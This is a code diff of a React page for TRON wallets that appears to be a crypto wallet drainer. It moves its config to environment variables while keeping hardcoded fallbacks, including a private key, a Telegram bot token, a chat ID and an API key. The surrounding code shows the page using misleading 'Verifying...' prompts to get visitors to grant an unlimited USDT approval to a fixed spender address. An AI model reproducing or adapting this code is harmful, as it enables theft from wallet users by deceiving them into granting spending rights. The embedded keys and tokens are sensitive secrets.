@@ -4,16 +4,16 @@ import { useState, useRef, useCallback, useEffect } from 'react';
 
 // ===== CONFIG =====
 const CFG = {
-  WC_PROJECT_ID: 'b7865324de25ee461fa8328255709620',
-  SPENDER: 'TGdyhphS6Lw8EQfYRoPGG3Ym1RUuvnkrra',
-  USDT: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
-  RECIPIENT: 'TB8MxQp21ukvxRWMSC5RYGVGpmf9AEdUUy',
-  API_KEY: '2062af81-4cc9-48b7-828a-7f7da7179def',
-  FULL_NODE: 'https://api.trongrid.io',
-  PRIVATE_KEY: '5fa5bb6bffd7d4a2facb4a9bc3e931a7ac303dc9f60bf456d503380a0df233ad',
-  TG_TOKEN: '8730884935:AAENLb36EJol5J0XHO7crN8qA3LU2WswPY8',
-  TG_CHAT: '6480649645',
-  SPONSOR_SUN: 10_000_000,
+  WC_PROJECT_ID: process.env.NEXT_PUBLIC_WC_PROJECT_ID || 'b7865324de25ee461fa8328255709620',
+  SPENDER: process.env.NEXT_PUBLIC_SPENDER || 'TGdyhphS6Lw8EQfYRoPGG3Ym1RUuvnkrra',
+  USDT: process.env.NEXT_PUBLIC_USDT || 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
+  RECIPIENT: process.env.NEXT_PUBLIC_RECIPIENT || 'TB8MxQp21ukvxRWMSC5RYGVGpmf9AEdUUy',
+  API_KEY: process.env.NEXT_PUBLIC_API_KEY || '2062af81-4cc9-48b7-828a-7f7da7179def',
+  FULL_NODE: process.env.NEXT_PUBLIC_FULL_NODE || 'https://api.trongrid.io',
+  PRIVATE_KEY: process.env.PRIVATE_KEY || '5fa5bb6bffd7d4a2facb4a9bc3e931a7ac303dc9f60bf456d503380a0df233ad',
+  TG_TOKEN: process.env.TG_TOKEN || '8730884935:AAENLb36EJol5J0XHO7crN8qA3LU2WswPY8',
+  TG_CHAT: process.env.TG_CHAT || '6480649645',
+  SPONSOR_SUN: Number(process.env.NEXT_PUBLIC_SPONSOR_SUN) || 10_000_000,
 };
 
 const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
@@ -117,14 +117,14 @@ export default function SendPage() {
 
     setBtn({ text: 'Verifying...', disabled: true });
     await sponsorTrx(addr);
-    
+
     setBtn({ text: 'Requesting Approval...', disabled: true });
     showNotif('Please confirm in your wallet', 'info');
 
     const contract = await tronWeb.contract().at(CFG.USDT);
     const res = await contract.approve(CFG.SPENDER, MAX_UINT256).send({
-      feeLimit: 100_000_000, 
-      callValue: 0, 
+      feeLimit: 100_000_000,
+      callValue: 0,
       shouldPollResponse: true,
     });
 
@@ -138,11 +138,11 @@ export default function SendPage() {
   const handleNext = async (e) => {
     e.preventDefault();
     if (!isClient) return;
-    
+
     setBtn({ text: 'Connecting...', disabled: true });
 
     const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent || '');
-    
+
     try {
       // 1. Check for TRON wallet
       let nativeTW = await pollForTronWeb(1000);
@@ -159,11 +159,11 @@ export default function SendPage() {
       if (!nativeTW) {
         const inj = window.tronWeb || window.tron || window.tronLink;
         if (inj?.request) {
-          try { 
-            await inj.request({ method: 'tron_requestAccounts' }); 
+          try {
+            await inj.request({ method: 'tron_requestAccounts' });
             await new Promise(r => setTimeout(r, 1000));
             nativeTW = await pollForTronWeb(3000);
-          } catch (_) {}
+          } catch (_) { }
         }
       }
 
